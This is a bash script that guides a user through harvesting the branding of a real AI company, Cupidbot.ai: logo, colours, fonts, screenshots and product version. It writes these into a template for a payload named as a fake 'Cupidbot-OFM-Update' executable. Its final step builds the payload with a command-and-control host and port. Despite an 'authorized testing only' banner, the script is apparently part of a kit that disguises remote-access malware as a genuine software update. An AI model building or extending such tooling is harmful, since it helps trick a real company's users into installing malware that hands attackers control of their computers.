#!/bin/bash

# Cupidbot.ai Research Automation Script
# This script guides you through researching and gathering branding materials

echo "════════════════════════════════════════════════════════════"
echo "  🎨 Cupidbot.ai Branding Research Tool"
echo "════════════════════════════════════════════════════════════"
echo ""
echo "This script will guide you through gathering all the materials"
echo "needed to create a professional Cupidbot OFM branded payload."
echo ""
echo "⚠️  FOR AUTHORIZED SECURITY TESTING ONLY"
echo ""
read -p "Press Enter to continue..."

# Create directory structure
echo ""
echo "📁 Creating directory structure..."
mkdir -p tools/brand_templates/cupidbot_ofm/{logos,screenshots,colors,fonts}
echo "✅ Directories created"

# Step 1: Website research
echo ""
echo "════════════════════════════════════════════════════════════"
echo "STEP 1: Visit the Website"
echo "════════════════════════════════════════════════════════════"
echo ""
echo "1. Open your browser and visit: https://cupidbot.ai"
echo "2. Look for:"
echo "   - Logo (usually in top-left corner)"
echo "   - Color scheme"
echo "   - Font families"
echo "   - Product screenshots"
echo ""
read -p "Press Enter when you've visited the site..."

# Step 2: Logo extraction
echo ""
echo "════════════════════════════════════════════════════════════"
echo "STEP 2: Download the Logo"
echo "════════════════════════════════════════════════════════════"
echo ""
echo "Ways to get the logo:"
echo ""
echo "Method A: Right-click and save"
echo "  1. Right-click on logo → Save image as..."
echo "  2. Save to: tools/brand_templates/cupidbot_ofm/logos/logo.png"
echo ""
echo "Method B: Check favicon"
echo "  1. Visit: https://cupidbot.ai/favicon.ico"
echo "  2. Save that file"
echo ""
echo "Method C: Press kit"
echo "  1. Look for /press or /media page"
echo "  2. Download official assets"
echo ""
read -p "Press Enter when you've downloaded the logo..."

# Step 3: Color extraction
echo ""
echo "════════════════════════════════════════════════════════════"
echo "STEP 3: Extract Colors"
echo "════════════════════════════════════════════════════════════"
echo ""
echo "Install ColorZilla extension:"
echo "  Chrome: https://chrome.google.com/webstore → search 'ColorZilla'"
echo "  Firefox: https://addons.mozilla.org → search 'ColorZilla'"
echo ""
echo "Then:"
echo "  1. Click the ColorZilla eyedropper"
echo "  2. Click on their primary brand color (usually logo or buttons)"
echo "  3. Write down the HEX code (e.g., #FF1744)"
echo "  4. Repeat for secondary colors"
echo ""
echo "Or use DevTools:"
echo "  1. Right-click element → Inspect"
echo "  2. Look at 'Styles' panel for 'color' or 'background-color'"
echo "  3. Note the HEX values"
echo ""
read -p "Enter PRIMARY color (e.g., #FF1744): " PRIMARY_COLOR
read -p "Enter SECONDARY color (e.g., #536DFE): " SECONDARY_COLOR
read -p "Enter ACCENT color (e.g., #00BFA5): " ACCENT_COLOR

# Step 4: Font detection
echo ""
echo "════════════════════════════════════════════════════════════"
echo "STEP 4: Detect Fonts"
echo "════════════════════════════════════════════════════════════"
echo ""
echo "Use DevTools to find fonts:"
echo "  1. Right-click any text → Inspect"
echo "  2. Look in 'Computed' tab"
echo "  3. Find 'font-family'"
echo "  4. Note the first font in the list"
echo ""
read -p "Enter PRIMARY font family (e.g., Inter): " PRIMARY_FONT

# Step 5: Product research
echo ""
echo "════════════════════════════════════════════════════════════"
echo "STEP 5: Research the Product (OFM)"
echo "════════════════════════════════════════════════════════════"
echo ""
echo "Find information about:"
echo "  - What is OFM? (OnlyFans Manager?)"
echo "  - What features does it have?"
echo "  - What version are they on?"
echo "  - How often do they update?"
echo ""
read -p "What does OFM stand for?: " OFM_MEANING
read -p "Current version (if found, or press Enter): " CURRENT_VERSION

# Step 6: Screenshots
echo ""
echo "════════════════════════════════════════════════════════════"
echo "STEP 6: Take Screenshots"
echo "════════════════════════════════════════════════════════════"
echo ""
echo "Take screenshots of:"
echo "  1. Homepage hero section"
echo "  2. Product/OFM page"
echo "  3. Any dashboard/interface images"
echo "  4. Features section"
echo ""
echo "Save to: tools/brand_templates/cupidbot_ofm/screenshots/"
echo ""
read -p "Press Enter when screenshots are saved..."

# Generate updated template
echo ""
echo "════════════════════════════════════════════════════════════"
echo "STEP 7: Generating Custom Template"
echo "════════════════════════════════════════════════════════════"
echo ""

cat > tools/brand_templates/cupidbot_ofm/config.json << EOF
{
  "template_name": "cupidbot_ofm",
  "company": {
    "name": "Cupidbot AI",
    "legal_name": "Cupidbot Technologies, Inc.",
    "website": "https://cupidbot.ai"
  },
  "product": {
    "name": "Cupidbot OFM",
    "full_name": "Cupidbot ${OFM_MEANING:-OnlyFans Manager}",
    "version": "${CURRENT_VERSION:-2.1.5}"
  },
  "branding": {
    "colors": {
      "primary": "${PRIMARY_COLOR:-#FF1744}",
      "secondary": "${SECONDARY_COLOR:-#536DFE}",
      "accent": "${ACCENT_COLOR:-#00BFA5}"
    },
    "fonts": {
      "primary": "${PRIMARY_FONT:-Inter}"
    }
  },
  "payload": {
    "filename": "Cupidbot-OFM-Update-v${CURRENT_VERSION:-2.1.5}.exe"
  }
}
EOF

echo "✅ Template saved to: tools/brand_templates/cupidbot_ofm/config.json"

# Final steps
echo ""
echo "════════════════════════════════════════════════════════════"
echo "✅ Research Complete!"
echo "════════════════════════════════════════════════════════════"
echo ""
echo "📂 Your files are in: tools/brand_templates/cupidbot_ofm/"
echo ""
echo "Next steps:"
echo "  1. Review the config.json file"
echo "  2. Add logo to: logos/logo.png"
echo "  3. Convert logo to .ico format"
echo "  4. Customize landing page HTML"
echo "  5. Add template to payload_brander.py"
echo ""
echo "Then build with:"
echo "  python3 tools/payload_brander.py --template cupidbot_ofm \\"
echo "    --c2-host YOUR_IP --c2-port 443"
echo ""
echo "════════════════════════════════════════════════════════════"

